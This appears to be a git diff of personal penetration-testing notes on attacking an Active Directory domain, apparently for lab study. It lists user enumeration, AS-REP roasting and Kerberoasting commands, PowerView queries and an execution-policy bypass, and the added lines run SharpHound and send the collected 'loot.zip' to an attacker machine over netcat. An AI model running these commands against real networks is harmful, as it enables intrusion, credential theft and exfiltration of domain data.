@@ -45,10 +45,23 @@ ldapsearch -h <IP> -x -b “DC=cascade,DC=local” ‘(objectClass=person)’
 4. `kerbrute userenum --dc $IP -d DOMAIN.NAME user.txt` user.txt is a userlist that we have created to authenticate to DC.
 5. `impacket-GetNPUsers -userfile user.txt -dc-ip $IP DOMAIN.NAME/`
 6. Crack the hash
+   
+   
 # After initial shell, credentials or some password (Enumeration)
+
 1. Things we want to know, domain admins, domain controller, domain policy
-2. Enumerate the initial target using powerview. Trasfer Powerview to target.
-3. https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+2. Enumerate the initial target using powerview. Trasfer Powerview , and gather info to send back to bloodhound
+```
+Transfer SharHound (exe or ps1) and nc.exe to target
+Run SharpHound.exe or .ps1
+. .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -Domain <DOMAIN.LOCAL> -ZipFileNmame loot.zip
+Transfer loot back to kali:
+- On $LHOST: nc -nlvp 4321 > loot.zip
+- On target: nc.exe -nv <kali IP> 4321 < loot.zip
+- Drag loot.zip into BloodHound GUI
+```
+4. https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993 (Some powerView Command cheatsheeet or refer below)
 5. `powershell -ep bypass ` `. .\PowerView.ps1` 
 6. `Get-NetDomain` , (domain info)
 7.  For manual inspection `net user` (for local accounts) `net user /domain` (for all domain users) `net user <USERNAME> /domain` 
@@ -63,7 +76,7 @@ ldapsearch -h <IP> -x -b “DC=cascade,DC=local” ‘(objectClass=person)’
 16.  `Get-NetLoggedon -ComputerName <current Computer name>  `(Find,Currently Logged on Users: their credentials will be saved in memory so find out logged in highvalue target or lateral movement)
 17.   `Get-NetSession -ComputerName dc01` (to verfify that domain controller is logged into what other pc)
 
-## Kerbreroasting (Service account)
+## Kerbreroasting (Service Account Attack (want to attack members of high value group )
 1. Once we have some username + password, we ask the Domian Controller for TGS (since we can request TGT) and try to crack TGS hash.
 ```
 impacket-GetUserSPNs <IP or hostname>/<username>:<password> -request [add -request if SPN is found]
